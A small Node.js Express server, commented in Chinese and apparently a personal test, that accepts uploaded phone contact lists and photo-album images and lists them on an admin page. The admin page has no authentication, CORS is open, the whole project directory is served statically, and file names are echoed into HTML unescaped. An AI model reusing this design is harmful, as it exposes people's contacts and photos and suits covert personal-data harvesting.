const express = require('express')
const cors = require('cors')
const multer = require('multer')
const fs = require('fs')
const app = express()
const port = process.env.PORT || 3000

// 基础配置
app.use(cors())
app.use(express.json())
// 直接托管根目录的静态文件（index.html 就在根目录）
app.use(express.static('./'))

// 上传文件夹配置
const upload = multer({ dest: 'upload/' })
if (!fs.existsSync('upload')) fs.mkdirSync('upload')

// 1. 载入基础设置接口
app.get('/api/set', (req, res) => {
    res.json({
        name: "by鱼笙 自用测试系统",
        status: "✅ 配置加载完成",
        auth: "请手动授权上传通讯录/相册数据"
    })
})

// 2. 接收通讯录数据
app.post('/api/contact', upload.single('file'), (req, res) => {
    res.json({ code: 200, msg: "通讯录文件已接收并保存" })
})

// 3. 接收相册图片
app.post('/api/photo', upload.single('img'), (req, res) => {
    res.json({ code: 200, msg: "相册图片已接收并保存" })
})

// 4. 后台查看上传的文件列表
app.get('/api/admin', (req, res) => {
    if (!fs.existsSync('upload')) {
        return res.send("暂无上传数据")
    }
    const list = fs.readdirSync('./upload')
    let html = "<h1>后台数据列表</h1><ul>"
    list.forEach(file => {
        html += `<li>${file}</li>`
    })
    html += "</ul>"
    res.send(html)
})

// 启动服务
app.listen(port, () => {
    console.log(`服务已启动，端口：${port}`)
})